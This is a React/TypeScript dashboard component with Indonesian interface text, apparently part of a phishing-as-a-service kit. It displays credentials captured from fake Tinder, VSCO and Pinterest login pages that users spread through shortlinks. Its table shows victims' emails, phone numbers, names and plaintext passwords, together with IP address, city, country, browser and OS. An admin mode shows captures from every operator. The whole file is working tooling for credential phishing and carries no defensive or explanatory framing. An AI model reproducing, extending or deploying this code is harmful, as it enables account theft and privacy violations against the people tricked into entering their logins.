'use client';

import { Badge } from '@/components/ui/badge';
import {
  Card,
  CardContent,
  CardDescription,
  CardHeader,
  CardTitle,
} from '@/components/ui/card';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import {
  Select,
  SelectContent,
  SelectGroup,
  SelectItem,
  SelectLabel,
  SelectTrigger,
  SelectValue,
} from '@/components/ui/select';
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from '@/components/ui/table';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Button } from '@/components/ui/button';
import { formatDate } from '@/lib/utils';
import {
  Eye,
  Facebook,
  Filter,
  Mail,
  Phone,
  RefreshCcw,
  Shield,
} from 'lucide-react';
import { useEffect, useState } from 'react';

interface FormCaptureData {
  id: string;
  source: string;
  email: string | null;
  password: string | null;
  name: string | null;
  phone: string | null;
  additional_data: any;
  ip: string | null;
  country: string | null;
  city: string | null;
  browser: string | null;
  device: string | null;
  os: string | null;
  created_at: bigint | null;
  shortcode?: string | null;
}

interface FiltersState {
  source: string | null;
  shortcode: string | null;
  showFilters: boolean;
  isAdmin?: boolean;
}

export function FormCapturesView() {
  const [formCaptures, setFormCaptures] = useState<FormCaptureData[]>([]);
  const [isLoading, setIsLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [filters, setFilters] = useState<FiltersState>({
    source: null,
    shortcode: null,
    showFilters: false,
    isAdmin: false,
  });
  const [shortcodeInput, setShortcodeInput] = useState('');

  const fetchFormCaptures = async () => {
    setIsLoading(true);
    try {
      let url = '/api/dashboard/form-captures';

      // Tambahkan parameter query jika filter aktif
      const queryParams = new URLSearchParams();
      if (filters.source) queryParams.append('source', filters.source);
      if (filters.shortcode) queryParams.append('shortcode', filters.shortcode);

      if (queryParams.toString()) {
        url += `?${queryParams.toString()}`;
      }

      const response = await fetch(url);

      if (!response.ok) {
        throw new Error('Failed to fetch form captures');
      }

      const data = await response.json();
      setFormCaptures(data.data || []);
      // Update isAdmin status jika ada di respons
      if (data.filters && data.filters.hasOwnProperty('isAdmin')) {
        setFilters((prev) => ({ ...prev, isAdmin: data.filters.isAdmin }));
      }
    } catch (err) {
      console.error('Error fetching form captures:', err);
      setError('Failed to load form captures data');
    } finally {
      setIsLoading(false);
    }
  };

  // Jalankan fetchFormCaptures saat komponen dimuat atau filter berubah
  useEffect(() => {
    fetchFormCaptures();
  }, [filters.source, filters.shortcode]);

  // Handler untuk mengubah filter source
  const handleSourceChange = (value: string) => {
    setFilters((prev) => ({ ...prev, source: value === 'all' ? null : value }));
  };

  // Handler untuk mengubah filter shortcode
  const handleShortcodeFilter = () => {
    setFilters((prev) => ({
      ...prev,
      shortcode: shortcodeInput.trim() === '' ? null : shortcodeInput.trim(),
    }));
  };

  // Handler untuk mereset filter
  const handleResetFilters = () => {
    setFilters({ source: null, shortcode: null, showFilters: false });
    setShortcodeInput('');
  };

  // Toggle tampilan filter
  const toggleFilters = () => {
    setFilters((prev) => ({ ...prev, showFilters: !prev.showFilters }));
  };

  // Helper function untuk mendapatkan warna badge berdasarkan source
  const getSourceColor = (source: string) => {
    switch (source.toLowerCase()) {
      case 'tinder':
        return 'bg-red-100 text-red-800 dark:bg-red-900 dark:text-red-300';
      case 'vsco':
        return 'bg-purple-100 text-purple-800 dark:bg-purple-900 dark:text-purple-300';
      case 'pinterest':
        return 'bg-yellow-100 text-yellow-800 dark:bg-yellow-900 dark:text-yellow-300';
      default:
        return 'bg-gray-100 text-gray-800 dark:bg-gray-700 dark:text-gray-300';
    }
  };

  // Helper function untuk mendapatkan ikon berdasarkan source
  const getSourceIcon = (source: string) => {
    switch (source.toLowerCase()) {
      case 'tinder':
        return <Eye className='h-4 w-4 text-red-600' />;
      case 'vsco':
        return <Facebook className='h-4 w-4 text-purple-600' />;
      case 'pinterest':
        return <Facebook className='h-4 w-4 text-yellow-600' />;
      default:
        return <Facebook className='h-4 w-4 text-gray-600' />;
    }
  };

  // Filter form captures berdasarkan source untuk tab
  const tinderCaptures = formCaptures.filter(
    (capture) => capture.source.toLowerCase() === 'tinder',
  );
  const vscoCaptures = formCaptures.filter(
    (capture) => capture.source.toLowerCase() === 'vsco',
  );
  const otherCaptures = formCaptures.filter(
    (capture) => !['tinder', 'vsco'].includes(capture.source.toLowerCase()),
  );

  if (isLoading) {
    return (
      <div className='flex h-96 items-center justify-center'>
        <div className='text-center'>
          <svg
            className='mx-auto h-10 w-10 animate-spin text-primary'
            xmlns='http://www.w3.org/2000/svg'
            fill='none'
            viewBox='0 0 24 24'
          >
            <circle
              className='opacity-25'
              cx='12'
              cy='12'
              r='10'
              stroke='currentColor'
              strokeWidth='4'
            ></circle>
            <path
              className='opacity-75'
              fill='currentColor'
              d='M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z'
            ></path>
          </svg>
          <p className='mt-4 text-sm text-muted-foreground'>
            Memuat data form captures...
          </p>
        </div>
      </div>
    );
  }

  if (error) {
    return (
      <div className='flex h-96 items-center justify-center'>
        <div className='text-center'>
          <div className='mx-auto flex h-10 w-10 items-center justify-center rounded-full bg-red-100 text-red-500'>
            <svg
              xmlns='http://www.w3.org/2000/svg'
              fill='none'
              viewBox='0 0 24 24'
              stroke='currentColor'
              className='h-6 w-6'
            >
              <path
                strokeLinecap='round'
                strokeLinejoin='round'
                strokeWidth={2}
                d='M6 18L18 6M6 6l12 12'
              />
            </svg>
          </div>
          <p className='mt-4 text-sm text-muted-foreground'>{error}</p>
        </div>
      </div>
    );
  }

  return (
    <div className='space-y-6'>
      <div className='flex flex-col justify-between gap-4 md:flex-row md:items-center'>
        <div>
          <h1 className='text-2xl font-bold tracking-tight'>
            Form Captures Data
            {filters.isAdmin && (
              <Badge
                variant='outline'
                className='ml-2 bg-yellow-100 text-yellow-800'
              >
                <Shield className='mr-1 h-3 w-3' />
                Admin Mode
              </Badge>
            )}
          </h1>
          <p className='text-muted-foreground'>
            {filters.isAdmin
              ? 'Data yang berhasil ditangkap dari semua halaman trap dan form palsu. Menampilkan data dari semua user.'
              : 'Data yang berhasil ditangkap dari halaman trap dan form palsu. Hanya menampilkan data dari shortlink yang Anda miliki.'}
          </p>
        </div>

        <div className='flex space-x-2'>
          <Button
            variant='outline'
            size='sm'
            onClick={toggleFilters}
            className='flex items-center'
          >
            <Filter className='mr-2 h-4 w-4' />
            Filter
          </Button>

          <Button
            variant='outline'
            size='sm'
            onClick={fetchFormCaptures}
            className='flex items-center'
          >
            <RefreshCcw className='mr-2 h-4 w-4' />
            Refresh
          </Button>
        </div>
      </div>

      {/* Filter Section */}
      {filters.showFilters && (
        <Card className='mb-6'>
          <CardHeader>
            <CardTitle className='text-lg'>Filter Data</CardTitle>
            <CardDescription>
              Filter data berdasarkan kriteria tertentu
            </CardDescription>
          </CardHeader>
          <CardContent>
            <div className='grid gap-6 md:grid-cols-2'>
              <div className='space-y-2'>
                <Label htmlFor='source'>Type Halaman</Label>
                <Select
                  onValueChange={handleSourceChange}
                  defaultValue={filters.source || 'all'}
                >
                  <SelectTrigger id='source'>
                    <SelectValue placeholder='Pilih tipe halaman' />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectGroup>
                      <SelectLabel>Tipe Halaman</SelectLabel>
                      <SelectItem value='all'>Semua Halaman</SelectItem>
                      <SelectItem value='tinder'>Tinder</SelectItem>
                      <SelectItem value='vsco'>VSCO</SelectItem>
                    </SelectGroup>
                  </SelectContent>
                </Select>
              </div>

              <div className='space-y-2'>
                <Label htmlFor='shortcode'>Shortcode</Label>
                <div className='flex space-x-2'>
                  <Input
                    id='shortcode'
                    placeholder='Masukkan shortcode'
                    value={shortcodeInput}
                    onChange={(e) => setShortcodeInput(e.target.value)}
                  />
                  <Button onClick={handleShortcodeFilter}>Filter</Button>
                </div>
              </div>
            </div>

            <div className='mt-4 flex justify-end'>
              <Button variant='outline' onClick={handleResetFilters}>
                Reset Filter
              </Button>
            </div>
          </CardContent>
        </Card>
      )}

      <Tabs defaultValue='all' className='space-y-4'>
        <TabsList>
          <TabsTrigger value='all'>Semua ({formCaptures.length})</TabsTrigger>
          <TabsTrigger value='tinder'>
            Tinder ({tinderCaptures.length})
          </TabsTrigger>
          <TabsTrigger value='vsco'>VSCO ({vscoCaptures.length})</TabsTrigger>
          <TabsTrigger value='other'>
            Lainnya ({otherCaptures.length})
          </TabsTrigger>
        </TabsList>

        <TabsContent value='all' className='space-y-4'>
          <FormCaptureTable
            formCaptures={formCaptures}
            getSourceColor={getSourceColor}
            getSourceIcon={getSourceIcon}
          />
        </TabsContent>

        <TabsContent value='tinder' className='space-y-4'>
          <FormCaptureTable
            formCaptures={tinderCaptures}
            getSourceColor={getSourceColor}
            getSourceIcon={getSourceIcon}
          />
        </TabsContent>

        <TabsContent value='vsco' className='space-y-4'>
          <FormCaptureTable
            formCaptures={vscoCaptures}
            getSourceColor={getSourceColor}
            getSourceIcon={getSourceIcon}
          />
        </TabsContent>

        <TabsContent value='other' className='space-y-4'>
          <FormCaptureTable
            formCaptures={otherCaptures}
            getSourceColor={getSourceColor}
            getSourceIcon={getSourceIcon}
          />
        </TabsContent>
      </Tabs>
    </div>
  );
}

interface FormCaptureTableProps {
  formCaptures: FormCaptureData[];
  getSourceColor: (source: string) => string;
  getSourceIcon: (source: string) => JSX.Element;
}

function FormCaptureTable({
  formCaptures,
  getSourceColor,
  getSourceIcon,
}: FormCaptureTableProps) {
  if (formCaptures.length === 0) {
    return (
      <Card>
        <CardHeader>
          <CardTitle>Tidak Ada Data</CardTitle>
          <CardDescription>
            Belum ada data form yang ditangkap untuk kategori ini
          </CardDescription>
        </CardHeader>
      </Card>
    );
  }

  return (
    <Card>
      <CardHeader>
        <CardTitle>Data Form Captures</CardTitle>
        <CardDescription>
          Informasi yang berhasil dikumpulkan dari halaman palsu melalui
          shortlink Anda
        </CardDescription>
      </CardHeader>
      <CardContent>
        <div className='overflow-x-auto'>
          <Table>
            <TableHeader>
              <TableRow>
                <TableHead className='w-[100px]'>Source</TableHead>
                <TableHead>Email / Phone</TableHead>
                <TableHead>Password</TableHead>
                <TableHead>Info</TableHead>
                <TableHead>Shortcode</TableHead>
                <TableHead className='text-right'>Tanggal</TableHead>
              </TableRow>
            </TableHeader>
            <TableBody>
              {formCaptures.map((capture) => (
                <TableRow key={capture.id}>
                  <TableCell className='font-medium'>
                    <div
                      className={`flex items-center rounded-md p-1 ${getSourceColor(
                        capture.source,
                      )}`}
                    >
                      {getSourceIcon(capture.source)}
                      <span className='ml-1'>{capture.source}</span>
                    </div>
                  </TableCell>
                  <TableCell>
                    {capture.email && (
                      <div className='flex items-center text-sm'>
                        <Mail className='mr-1 h-4 w-4' />
                        {capture.email}
                      </div>
                    )}
                    {capture.phone && (
                      <div className='flex items-center text-sm'>
                        <Phone className='mr-1 h-4 w-4' />
                        {capture.phone}
                      </div>
                    )}
                    {capture.name && (
                      <div className='mt-1 text-xs text-muted-foreground'>
                        Name: {capture.name}
                      </div>
                    )}
                  </TableCell>
                  <TableCell>
                    {capture.password ? (
                      <div className='flex items-center gap-1'>
                        <Shield className='h-4 w-4 text-red-600' />
                        <span className='font-mono text-sm'>
                          {capture.password}
                        </span>
                      </div>
                    ) : (
                      <span className='text-sm text-muted-foreground'>N/A</span>
                    )}
                  </TableCell>
                  <TableCell>
                    <div className='text-sm'>
                      <div>{capture.ip || 'N/A'}</div>
                      {capture.country && (
                        <div className='text-xs text-muted-foreground'>
                          {capture.city ? `${capture.city}, ` : ''}
                          {capture.country}
                        </div>
                      )}
                      {capture.browser && (
                        <div className='text-xs text-muted-foreground'>
                          {capture.browser} / {capture.os}
                        </div>
                      )}
                    </div>
                  </TableCell>
                  <TableCell>
                    {capture.shortcode ? (
                      <span className='rounded bg-gray-100 p-1 font-mono text-xs dark:bg-gray-800'>
                        {capture.shortcode}
                      </span>
                    ) : (
                      <span className='text-xs text-gray-400'>-</span>
                    )}
                  </TableCell>
                  <TableCell className='text-right'>
                    {capture.created_at
                      ? formatDate(capture.created_at.toString())
                      : 'N/A'}
                  </TableCell>
                </TableRow>
              ))}
            </TableBody>
          </Table>
        </div>
      </CardContent>
    </Card>
  );
}
